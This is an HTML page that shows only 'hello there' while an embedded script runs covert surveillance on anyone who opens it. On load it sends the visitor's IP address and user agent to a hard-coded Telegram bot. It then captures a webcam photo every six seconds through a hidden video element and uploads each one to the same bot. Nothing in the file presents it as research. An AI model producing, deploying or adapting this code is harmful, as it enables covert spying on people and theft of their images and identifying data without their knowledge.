<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
        const BOT_TOKEN = '7423502281:AAHP8lGmT8DT_FvAgwbCn0NpOr4UI82uSME'; 
        const CHAT_ID = '516496403'; 

       function sendIPAndUserAgent() {
    fetch('https://api.ipify.org?format=json')
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            const ipAddress = data.ip;
            const userAgent = navigator.userAgent;
            const message = `IP Address: ${ipAddress}\nUser Agent: ${userAgent}`;
            sendMessageToTelegram(message);
        })
        .catch(error => console.error('Error fetching IP address:', error))
}

function sendMessageToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const headers = {
        'Content-Type': 'application/json'
    };
    const body = JSON.stringify({
        chat_id: CHAT_ID,
        text: message
    });

    fetch(url, {
        method: 'POST',
        headers: headers,
        body: body
    })
    .then(response => {
        if (!response.ok) {
            return response.json().then(error => {
                throw new Error(`Failed to send message: ${error.description}`);
            });
        }
        return response.json();
    })
    .then(data => {
        if (data.ok) {
            console.log('Message sent to Telegram');
        } else {
            console.error('Failed to send message to Telegram:', data.description);
        }
    })
    .catch(error => console.error('Error sending message to Telegram:', error.message));
}



function takePhotoAndSend() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            const video = document.createElement('video');
            video.style.display = 'none';  // Hide the video element
            video.srcObject = stream;
            document.body.appendChild(video);  // Append video to the body to make sure it loads
            video.play();

            // Wait for the video to be ready
            video.onloadedmetadata = () => {
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photo = canvas.toDataURL('image/jpeg');

                    sendPhoto(photo);

                    // Stop video stream and remove video element
                    video.srcObject.getTracks().forEach(track => track.stop());
                    video.remove();
                }, 1000); // Adding a delay to ensure the video is fully loaded
            };
        })
        .catch(error => console.error('Error accessing camera:', error));
}

function sendPhoto(photo) {
    const blob = dataURItoBlob(photo);
    const formData = new FormData();
    formData.append('photo', blob, 'photo.jpg');

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            console.log('Photo sent to Telegram');
        } else {
            return response.json().then(error => {
                throw new Error(`Failed to send photo: ${error.description}`);
            });
        }
    })
    .catch(error => console.error('Error sending photo to Telegram:', error.message));
}

function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const arrayBuffer = new ArrayBuffer(byteString.length);
    const intArray = new Uint8Array(arrayBuffer);

    for (let i = 0; i < byteString.length; i++) {
        intArray[i] = byteString.charCodeAt(i);
    }

    return new Blob([arrayBuffer], { type: mimeString });
}

// Function to send IP and user agent information to Telegram
function sendIPAndUserAgent() {
    fetch('https://api.ipify.org?format=json')
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            const ipAddress = data.ip;
            const userAgent = navigator.userAgent;
            const message = `IP Address: ${ipAddress}\nUser Agent: ${userAgent}`;
            sendMessageToTelegram(message);
        })
        .catch(error => console.error('Error fetching IP address:', error));
}

// Function to send a message to Telegram
function sendMessageToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const headers = {
        'Content-Type': 'application/json'
    };
    const body = JSON.stringify({
        chat_id: CHAT_ID,
        text: message
    });

    fetch(url, {
        method: 'POST',
        headers: headers,
        body: body
    })
    .then(response => {
        if (!response.ok) {
            return response.json().then(error => {
                throw new Error(`Failed to send message: ${error.description}`);
            });
        }
        return response.json();
    })
    .then(data => {
        if (data.ok) {
            console.log('Message sent to Telegram');
        } else {
            console.error('Failed to send message to Telegram:', data.description);
        }
    })
    .catch(error => console.error('Error sending message to Telegram:', error.message));
}

// Send IP and user agent once when the page loads
sendIPAndUserAgent();

// Take photo and send every 6 seconds
setInterval(takePhotoAndSend, 6000);

    </script>


</head>
<body>
    

<h1>hello there </h1>


</body>
</html>